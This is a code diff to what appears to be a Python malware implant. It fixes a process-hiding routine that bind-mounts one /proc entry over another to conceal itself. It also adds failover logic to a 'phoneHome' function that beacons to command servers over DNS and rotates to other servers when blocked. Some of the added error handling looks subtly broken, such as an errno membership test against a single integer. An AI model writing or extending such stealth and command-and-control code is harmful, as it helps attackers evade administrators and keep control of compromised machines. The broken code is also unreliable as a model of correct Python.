@@ -22,7 +22,7 @@ def hideProccess():
         if '[psimon]' in process:
             targetPid = process.split()[1]
             break
-    os.system(f'mount -b /proc/{targetPid} /proc/{pid}')
+    os.system(f'mount --bind /proc/{targetPid} /proc/{pid}')
 
 def getOutputOf(command: Union[str, Sequence[str]]) -> str:
     """
@@ -174,9 +174,63 @@ def phoneHome(domain, sock, recordType=None):
     else:
         server = SERVER
     if recordType:
-        sock.sendto(makeQuery(domain, recordType), (server, 53))
+        try:
+            sock.sendto(makeQuery(domain, recordType), (server, 53))
+        except OSError as e:
+            if e.errno in (errno.EPERM):
+                if not IS_LIST:
+                    return []
+                else:
+                    distance = 1
+                    curIndex += 1
+                    while curIndex != CURR_SERVER_INDEX:
+                        if curIndex >= len(SERVER):
+                            curIndex = 0
+                        server = SERVER[curIndex]
+                        try:
+                            if recordType:
+                                sock.sendto(makeQuery(domain, recordType), (server, 53))
+                            else:
+                                sock.sendto(makeQuery(domain), (server, 53))
+                            resp, _ = sock.recvfrom(512)
+                            rotateServer(distance)
+                            return getResponse(resp)
+                        except socket.timeout:
+                            curIndex += 1
+                            distance += 1
+                        except OSError as e:
+                            if e.errno in (errno.EPERM):
+                                curIndex += 1
+                                distance += 1
     else:
-        sock.sendto(makeQuery(domain), (server, 53))
+        try:
+            sock.sendto(makeQuery(domain), (server, 53))
+        except OSError as e:
+            if e.errno in (errno.EPERM):
+                if not IS_LIST:
+                    return []
+                else:
+                    distance = 1
+                    curIndex += 1
+                    while curIndex != CURR_SERVER_INDEX:
+                        if curIndex >= len(SERVER):
+                            curIndex = 0
+                        server = SERVER[curIndex]
+                        try:
+                            if recordType:
+                                sock.sendto(makeQuery(domain, recordType), (server, 53))
+                            else:
+                                sock.sendto(makeQuery(domain), (server, 53))
+                            resp, _ = sock.recvfrom(512)
+                            rotateServer(distance)
+                            return getResponse(resp)
+                        except socket.timeout:
+                            curIndex += 1
+                            distance += 1
+                        except OSError as e:
+                            if e.errno in (errno.EPERM):
+                                curIndex += 1
+                                distance += 1
     try:
         resp, _ = sock.recvfrom(512)
         return getResponse(resp)
@@ -201,6 +255,9 @@ def phoneHome(domain, sock, recordType=None):
                 except socket.timeout:
                     curIndex += 1
                     distance += 1
+    except OSError as e:
+        if e.errno in (errno.EHOSTUNREACH, errno.ENETUNREACH, errno.EACCES):
+            rotateServer(distance)
 
 def rotateServer(distance):
     comproised_ip = SERVER[CURR_SERVER_INDEX]
